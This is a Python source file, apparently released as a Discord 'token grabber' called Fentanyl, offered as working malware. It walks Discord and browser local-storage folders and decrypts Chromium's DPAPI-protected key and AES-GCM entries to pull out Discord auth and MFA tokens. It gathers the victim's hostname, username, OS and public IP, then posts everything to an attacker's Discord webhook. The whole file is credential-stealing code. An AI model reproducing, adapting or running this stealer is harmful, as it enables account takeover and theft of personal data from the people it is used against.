# /Cicada - fentanyl
# Discord token grabber 

import os
import re
import json
import base64
import ctypes
import socket
import platform
import requests
from ctypes import wintypes
from pathlib import Path

WEBHOOK = "WEBHOOK HERE"

ROAM  = os.getenv("APPDATA", "")
LOCAL = os.getenv("LOCALAPPDATA", "")

# ---------------------------------------------------------------- targets
LEVELDB_PATHS = {
    "Discord":          rf"{ROAM}\discord\Local Storage\leveldb",
    "Discord Canary":   rf"{ROAM}\discordcanary\Local Storage\leveldb",
    "Discord PTB":      rf"{ROAM}\discordptb\Local Storage\leveldb",
    "Chrome":           rf"{LOCAL}\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "Chrome Profile 1": rf"{LOCAL}\Google\Chrome\User Data\Profile 1\Local Storage\leveldb",
    "Edge":             rf"{LOCAL}\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
    "Brave":            rf"{LOCAL}\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
    "Opera":            rf"{ROAM}\Opera Software\Opera Stable\Local Storage\leveldb",
    "Opera GX":         rf"{ROAM}\Opera Software\Opera GX Stable\Local Storage\leveldb",
    "Vivaldi":          rf"{LOCAL}\Vivaldi\User Data\Default\Local Storage\leveldb",
    "Yandex":           rf"{LOCAL}\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb",
}

# ---------------------------------------------------------------- regex
TOKEN_RE = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
MFA_RE   = re.compile(r"mfa\.[\w-]{80,90}")

# ---------------------------------------------------------------- DPAPI
class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi_decrypt(blob: bytes):
    bin_  = DATA_BLOB(len(blob), ctypes.cast(blob, ctypes.POINTER(ctypes.c_char)))
    bout  = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(bin_), None, None, None, None, 0, ctypes.byref(bout)):
        data = ctypes.string_at(bout.pbData, bout.cbData)
        ctypes.windll.kernel32.LocalFree(bout.pbData)
        return data
    return None

def get_master_key(local_state_path: str):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            state = json.load(f)
        enc = base64.b64decode(state["os_crypt"]["encrypted_key"])
        return dpapi_decrypt(enc[5:])  # strip "DPAPI" prefix
    except Exception:
        return None

def aes_gcm_decrypt(key: bytes, blob: bytes):
    try:
        from Crypto.Cipher import AES
    except ImportError:
        return None
    try:
        nonce, tag, ct = blob[3:15], blob[15:27], blob[27:]
        return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag).decode("utf-8", "ignore")
    except Exception:
        return None

# ---------------------------------------------------------------- harvest
def scan_leveldb(folder: str, master_key=None):
    found = set()
    if not os.path.isdir(folder):
        return found
    for fname in os.listdir(folder):
        if not fname.endswith((".ldb", ".log")):
            continue
        try:
            raw = open(os.path.join(folder, fname), "rb").read()
        except Exception:
            continue

        # plaintext pass
        for m in TOKEN_RE.findall(raw.decode("utf-8", "ignore")):
            found.add(m)
        for m in MFA_RE.findall(raw.decode("utf-8", "ignore")):
            found.add(m)

        # v10-encrypted pass
        if master_key:
            for blob in re.findall(rb"v10[\x00-\xff]{40,200}", raw):
                pt = aes_gcm_decrypt(master_key, blob)
                if pt and TOKEN_RE.fullmatch(pt):
                    found.add(pt)
    return found

def collect():
    results = {}
    for name, path in LEVELDB_PATHS.items():
        if not os.path.isdir(path):
            continue
        # Local State lives one or two dirs up from leveldb
        root = Path(path).parents[1]
        ls   = root / "Local State"
        key  = get_master_key(str(ls)) if ls.exists() else None
        hits = scan_leveldb(path, key)
        if hits:
            results[name] = sorted(hits)
    return results

# ---------------------------------------------------------------- exfil
def sysinfo():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except Exception:
        ip = "unknown"
    return {
        "host":    socket.gethostname(),
        "user":    os.getenv("USERNAME") or os.getenv("USER") or "unknown",
        "os":      f"{platform.system()} {platform.release()}",
        "ip":      ip,
    }

def send(hits, info):
    if not hits:
        return
    lines = []
    for src, toks in hits.items():
        lines.append(f"**{src}**")
        for t in toks:
            lines.append(f"`{t}`")
    embed = {
        "title": "Fentanyl | token grab",
        "color": 0x00FFAA,
        "description": "\n".join(lines)[:4000],
        "footer": {"text": f'{info["user"]}@{info["host"]} | {info["os"]} | {info["ip"]}'}
    }
    try:
        requests.post(WEBHOOK, json={"embeds": [embed]}, timeout=10)
    except Exception:
        pass

# ---------------------------------------------------------------- run
if __name__ == "__main__":
    hits = collect()
    send(hits, sysinfo())
